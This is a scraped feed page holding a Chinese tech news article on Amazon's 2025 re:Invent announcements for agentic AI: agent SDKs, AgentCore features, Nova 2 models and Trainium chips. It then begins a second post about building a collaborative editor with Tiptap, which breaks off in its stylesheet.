                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最先进的 Agentic AI，现在是做什么工作的？</p>
<p>在搞太空探索。</p>
<p>上个月，蓝色起源「新格伦」重型运载火箭首次成功实现了一级回收，在与 SpaceX 的竞争中迈出了重要一步。Agent 在其中起到了举足轻重的作用。据说，蓝色起源全员都在用生成式 AI 工具提升效率，为此他们甚至构建了一个叫 BlueGPT 的内部平台。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/041f236ff50e44888329ea2c40ad1748~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=Z6AYtMtliEYLhNWfIUVYmRATO3s%3D" alt="图片" loading="lazy"/></p>
<p>BlueGPT 背靠亚马逊云科技的 AI 全家桶，有了它，蓝色起源的工程师在用 Agent 写代码，新格伦火箭在用 Agent 加速火箭发射的审批流程，供应链在用 Agent 沟通物料修改，航电部门在用 Agent 开发飞控软件……总体工程速度提升了 75%。原来贝索斯的新格伦追上马斯克的猎鹰，背后原因竟是这样。</p>
<p>这还只是新时代的冰山一角。今天凌晨，亚马逊云科技一年一度的 re:Invent 大会上，全世界都见证了「云计算一哥」一个又一个重量级新发布，大部分都是面向 Agentic AI 的。</p>
<p>在昨天、今天的 Keynote 中，亚马逊云科技向全球传递了一个明确信号：AI Agent（智能体）的时代已经全面开启。现在不跟上，可就要落后了。</p>
<p>全流程短板补齐后</p>
<p>Agent 能力实现爆发</p>
<p>亚马逊云科技认为，Agent 的出现正在让我们的轨迹发生变化，它对业务产生的影响或许就像当年互联网和云服务出现时一样大。</p>
<p>Agent 与传统大模型助手的根本区别在于其具有自主行动能力。它们不仅回答问题，还能主动帮用户执行任务，让工作流程自动化，并能在复杂环境中动态推理。如今在某些任务上，已有 AI Agent 将工作效率提高了 10 倍，这就让人们有了更多的时间可以专注于创造性的工作。那么问题来了 —— 能让所有工作都获得这样的效率提升吗？Agent 又从何而来？</p>
<p>在当地时间周三 2025 re:Invent 的演讲中，亚马逊云科技 Agentic AI 高级副总裁 Swami Sivasubramanian 着重介绍了快速构建 Agent 的能力：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c90605ee4684adcbce38cbab5ef490a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=tL6rADs4%2BVatSOFL401CX%2BgRGBc%3D" alt="图片" loading="lazy"/></p>
<p>他先让我们回忆了一下：你当初写下第一行代码时是怎样的感觉？那时我们充满创作欲，仿佛能做到任何事。Agent 时代，我们正在找回这种创作的自由。</p>
<p>想让 Agent 真正落地到大规模生产阶段，是一件很有挑战的事。首先，如何快速、大规模地部署 Agent？</p>
<p>亚马逊云科技发布了开源、模型驱动的 AI Agent 框架 Strands Agents SDK 的更新。首先，Strands Agents SDK 被引入了 TypeScript 平台，让开发者能够使用 Amazon CDK 在 TypeScript 中构建完整的 Agent 堆栈。</p>
<p>Strands 同时新增了对边缘设备的支持，人们现在可以在小型设备上运行自主的 AI Agent，覆盖从汽车、游戏机到机器人等领域的大量应用场景。</p>
<p>全托管生成式 AI 服务 Amazon Bedrock 上，用于帮助开发者构建生产环境 Agent 的 AgentCore 新增了三大能力。</p>
<p>其中，Policy 让开发者可以使用自然语言为 Agent 操作设定清晰的边界。Evaluations 则提供 13 个预置评估器，可评估 Agent 行为的正确性和安全性等维度，并持续对实时交互进行采样，以便在性能下降时触发警报，从而简化日趋复杂的 Agent 行为监控。</p>
<p>如果想让 Agent 更加实用化，迈过能执行复杂工作的门槛，一个必须要解决的问题在于长期的记忆能力。如何让模型能够记住过去的交互、学到的知识？</p>
<p>AgentCore Memory 引入了全新的情景式功能，能够帮助 Agent 从过往经验中（上下文、推理、操作和结果）学习，让 AI 随着时间的推移逐步构建对用户的连贯理解，进而输出更加智能化的决策。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d92acc8ffa74bbe9501b1750647058e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=tcWJbaO7KVAHWyNN5WhoBVLcnyI%3D" alt="图片" loading="lazy"/></p>
<p>随着 Agent 构建变得越来越容易，下一个重要问题将随之而来：如何让它们更高效？</p>
<p>解决这个问题要从构建定制化的模型开始，Swami 表示，「如今的基础 AI 模型拥有足够高的智商，能够处理复杂易用、多步骤的推理以及突发情况，但它们并非总是最高效的。而 AI 的效率有关成本、规模、延迟与敏捷性。」</p>
<p>在他看来，能够高效执行特定任务的定制化高质量模型将成为主流。为此，亚马逊云科技推出了一系列旨在降低 AI 模型定制的复杂性和成本，同时「无需大量博士参与」的工具。</p>
<p>在 Amazon Bedrock 上，亚马逊云科技提出了全新的模型定制工具，其中强化学习微调（RFT）后的模型与基础模型相比准确率可提升 66%，大幅降低了模型定制化的门槛。针对特定任务的专业化训练 Model Distillation 旨在创建更小更快的模型，能够带来 10 倍的速度提升，同时保留 95-98% 的性能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55b3dfbf950c44dfac37f8edca6dd275~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=q9satXbxbXNU7fLeuG2xiYCddsM%3D" alt="图片" loading="lazy"/></p>
<p>无服务器模型的定制功能是 AI Agent 引导的定制体验，只需自然语言交互即可定制模型。Amazon Nova Forge 开创了「开放式训练」的先河。它让企业能够在模型训练的每个阶段直接将专有数据与 Amazon Nova 基础模型原有的数据相融合。最终生成的定制模型不仅融合了 Amazon Nova 的全部知识和推理能力，还能深入理解了每个特定业务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ce30ac3f0d745ca8f410e8a669f7f67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=dHVOlfPabuyNy7Ob%2BehTYmLJZGc%3D" alt="图片" loading="lazy"/></p>
<p>接下来还要支持的基础模型还包括 DeepSeek、GPT-OSS、Llama 和千问。现在，模型定制可在数天内完成，而不再需要数月。</p>
<p>而 Amazon SageMaker HyperPod 则缩短了重启周期，无需人工干预，几分钟内即可从模型训练故障中恢复，在拥有数千个 AI 加速器的集群上能实现 95% 的训练集群效率。Amazon SageMaker HyperPod 则简化了模型训练和部署的基础设施管理，最多可降低 40% 的成本。</p>
<p>最后，在生产环境中大量部署的 Agent，如何才能减少幻觉，值得我们信任？</p>
<p>在 AI IDE Kiro 上，工程师们结合大语言模型和自动推理（Automated Reasoning）数学逻辑验证的方法确保了 Agent 行为的正确性。</p>
<p>亚马逊云科技还提出了一套用于构建和管理可靠 UI 工作流程 AI Agent 的全新服务 ——Nova Act。它由定制版 Amazon Nova 2 Lite 模型驱动，为构建和管理自动化浏览器任务的代理集群提供了最快捷、最简便的途径。Nova Act 在早期客户工作流程中实现了高达 90% 的可靠性。</p>
<p>借助 Nova Act，开发者可以在几分钟内通过无代码的自然语言 Prompt 快速构建 Agent 原型，然后在熟悉的 IDE（例如 VS Code）中不断完善，最后部署到云环境上。</p>
<p>有多可靠呢？亚马逊云科技在现场展示了人机协作的反电诈，Agent 帮你识别信用卡盗刷：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb6d395b63024b62bfe3bb9d92944477~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=tHB4Lv4uk%2BH6cok0mrzia4xbcOY%3D" alt="图片" loading="lazy"/></p>
<p>在检查信用卡交易的过程中，Agent 可以合理提出怀疑，收集证据进行推理，还能直接帮你报警。现在，你可以更加自然地相信 Agent 为你办的事了。</p>
<p>从易用的 Agent 工具，高效率的模型定制化，到先进的可靠性技术，亚马逊云科技提出的一系列 AI 工具已经实现了从「如何构建」到「如何快速构建」的转变，让开发者们能够把宝贵的时间用在实践想法，创造新事物上。可谓是给未来的全新生产环境打好了基础。</p>
<p>这样的能力背后，是从最底层硬件算力开始，打造的一整套完善且独一无二的体系。</p>
<p>如何构建好 Agent？</p>
<p>分四步走</p>
<p>当地时间本周二，亚马逊云科技首席执行官 Matt Garman 在 2025re:Invent 大会第一天的 Keynote 上，深入介绍了自家最近各个维度的创新突破。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65160d9ce272490c910923f7048e3436~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=cr2%2FmJ9RBEqLr%2BJ0M68w1HRwc3E%3D" alt="图片" loading="lazy"/></p>
<p>在长达两个小时十分钟的 Keynote 上，Matt Garman 花费了 50% 时间都在讲一件事：如何构建好 Agent。</p>
<p>在他看来，想要让 Agent 形成生产力，整条技术栈主要分成四大部分：算力基础设施、推理平台、数据以及构建 Agent 的工具链。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a8f5e4b046047229d93563669fb9662~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=m0Rlt%2BN1AlrY0szRyb4k%2FNa0WA8%3D" alt="图片" loading="lazy"/></p>
<p>首先是算力基础设施。要构建最强大、最具扩展性的 AI 基础设施，必须拥有高度可扩展且安全的云平台。实现这一点并不容易，意味着需要在硬件和软件的每一层持续优化，而这正是亚马逊云科技的优势。</p>
<p>亚马逊云科技是目前运行 NVIDIA GPU 的最佳场所，在合作过程中，亚马逊云科技积累了丰富的大规模 GPU 运行经验。</p>
<p>在此基础上，亚马逊云科技进一步推出了 P6e 和 P6 两个实例，其中 P6e GB200 超级服务器相比上一代 P5e，计算性能提升超过 20 倍。亚马逊云科技还宣布推出全新的 P6e GB300，以满足最苛刻的 AI 工作负载。</p>
<p>在芯片方面，亚马逊云科技推出了最新的 Trainium 3 （首个云端 3nm 芯片）芯片实例，Trn3 UltraServers 正式全面可用。与上一代相比，新一代在关键性能上实现大幅跃升：计算能力提升 4.4 倍、内存带宽提高 3.9 倍、每瓦可处理的 Token 数量增加 5 倍，为大规模 AI 训练与推理带来显著的效率与能效优势。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b044d22c1efa4f99a58b475b2b89910c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=pm9h5dgTWdlWMY5pCTwey4u0d6k%3D" alt="图片" loading="lazy"/></p>
<p>除此之外，亚马逊云科技预告了全新的 Trainium4 芯片。作为最新一代 AI 加速芯片，它在关键性能指标上实现了大幅跃升：在 FP4 精度下提升 6 倍的算力，内存带宽提升 4 倍，内存容量翻倍，并通过 NVLink Fusion 与 UALink 支持更大规模的集群互联。</p>
<p>第二是推理平台。Amazon Bedrock 为用户提供了丰富而多元的模型选择，覆盖开源模型、通用模型以及专用模型等多种类型。此次，Amazon Bedrock 引入了多款最新开源模型，包括谷歌的 Gemma、NVIDIA 的 Nemotron，以及来自 KIMI 和 Minimax 厂商的最新模型。Mistral AI 的两款全新开源模型 Mistral Large 3 和 Ministral 3（3B、8B、14B）也已上线 Amazon Bedrock，从而为企业构建生成式 AI 应用带来更广泛、更灵活的选择空间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cd09440bb2b491189df994240280a05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=H%2BLXp0xzkynJ1BTsm5cBV6dhXyA%3D" alt="图片" loading="lazy"/></p>
<p>除了引入大量第三方模型外，Amazon Bedrock 还集成了自研的基础模型系列 Amazon Nova。如今，Amazon Nova 家族全线迭代至 Amazon Nova 2，在延续强大智能能力的同时，将成本效率与低延迟表现大幅提升。当前，Amazon Nova 2 已推出四个版本：</p>
<ul>
<li>
<p>Amazon Nova 2 Lite：快速、高效、经济的推理模型，适用于多种通用工作负载；</p>
</li>
<li>
<p>Amazon Nova 2 Pro：面向高度复杂任务，具备更强的推理能力，是迄今最智能的 Amazon Nova 推理模型，适用于高度复杂的工作负载；</p>
</li>
<li>
<p>Amazon Nova 2 Sonic：下一代语音到语音模型，提供行业领先对话质量，改进延迟，大幅扩展语言支持；</p>
</li>
<li>
<p>Amazon Nova 2 Omni：业界首个真正统一的多模态模型，支持文本、图像、视频、音频输入，并支持文本和图像输出。</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd4b5250b7334a4bb1851070e2e46866~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=n6LdCiwh6V7ivTPORERbaFoacaU%3D" alt="图片" loading="lazy"/></p>
<p>在基准测试中，Amazon Nova 2 Lite 性能比肩 GPT-5 Mini、Claude Haiku 4.5 、Gemini Flash 2.5 等业界前沿模型。Amazon Nova 2 Pro 也表现亮眼，在指令遵循、Agentic 工具使用等基准上超越 GPT-5.1、Gemini 3 Pro Preview  以及 Claude Sonnet 4.5。</p>
<p>第三是数据。亚马逊云科技推出的全新服务 Amazon Nova Forge，提出了开放训练模型的概念。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78cda68411534f2199e2473c100eaf2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=9DeufMcDl0gwSV1FBlPvzQdVyUI%3D" alt="图片" loading="lazy"/></p>
<p>第四部分是构建 Agent 的工具链。亚马逊云科技的先进 Agentic 平台 Amazon Bedrock AgentCore，可以大规模地安全构建、部署和运行高性能 Agent。为了确保 Agent 行为的安全性与合规性，亚马逊云科技开放了 Policy、Evaluations 功能，可以助力开发者构建可用于生产环境的 Agent。</p>
<p>基础搭好了，接下来是实践。</p>
<p>亚马逊云科技提出，要更快地把 Agent 加入到日常工作中来。Amazon Quick 作为一款面向企业的智能 Agent 应用，不仅能够帮助用户进行深度分析、数据可视化和工作流自动化，还通过企业级的安全与隐私标准确保信息的可靠性与合规性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bddb63ee4bf47898ce7c1f014ab91e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443097&amp;x-signature=LByaZzwS9ecROD%2FnlL%2BY9m58DVw%3D" alt="图片" loading="lazy"/></p>
<p>在人们关心的 AI 编程领域上，亚马逊云科技重点展示了构建、扩展、长期运行 Frontier Agent 能力。对此提出了三大 Agent：</p>
<ul>
<li>
<p>Kiro Autonomous Agent：作为虚拟开发者，能够独立完成任务并在工作中持续学习；</p>
</li>
<li>
<p>Amazon Security Agent：承担虚拟安全工程师角色，在应用设计、代码审查与渗透测试等环节充当安全顾问；</p>
</li>
<li>
<p>Amazon DevOps Agent：帮助开发者，尤其是负责值班的工程师，主动发现系统故障或潜在缺陷。</p>
</li>
</ul>
<p>从底层算力到推理平台，从数据到 Agent 工具链，再到面向企业实际落地的现代化与生产力产品，亚马逊云科技在今年 re:Invent 上勾勒出的，是一个面向 AI Agent 全面普及时代的完整蓝图。</p>
<p>数十亿 Agent 的未来</p>
<p>来得会比我们想象要快</p>
<p>作为技术全球化的推动者，亚马逊云科技每年的新发布都会受到开发者、企业的关注。在 AI 时代，其业务增长的速度也非常惊人。</p>
<p>2025 re:Invent 大会上，亚马逊云科技给出了一串数字：作为云基础设施的核心，Amazon S3 存储了超过 500 万亿个对象，每秒平均处理 2 亿次请求。而 AI 服务 Amazon Bedrock 目前为全球超过 10 万家企业提供 AI 推理支持。由此推动，亚马逊云科技的年收入已达 1320 亿美元，相比去年增长了 20%。</p>
<p>这不只是业绩展示，更是在指引 AI 时代的新方向 —— 当全球企业加速拥抱生成式 AI 时，这家云巨头已经准备好了从芯片到应用的全套工具箱。在 Matt Garman 的想象中，未来每个公司、每个行业中都会活跃着数十亿个 Agent，每个组织、每个人都能从人工智能那里获得真实的价值。</p>
<p>新时代的大门已经打开，门后的世界，正在被重新定义。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[半年时间使用 Tiptap 开发一个和飞书差不多效果的协同文档 😍😍😍]]></title>    <link>https://juejin.cn/post/7579702046955225131</link>    <guid>https://juejin.cn/post/7579702046955225131</guid>    <pubDate>2025-12-04T08:55:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579702046955225131" data-draft-id="7579702046955175979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="半年时间使用 Tiptap 开发一个和飞书差不多效果的协同文档 😍😍😍"/> <meta itemprop="keywords" content="前端,JavaScript,后端"/> <meta itemprop="datePublished" content="2025-12-04T08:55:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            半年时间使用 Tiptap 开发一个和飞书差不多效果的协同文档 😍😍😍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:55:55.000Z" title="Thu Dec 04 2025 08:55:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body 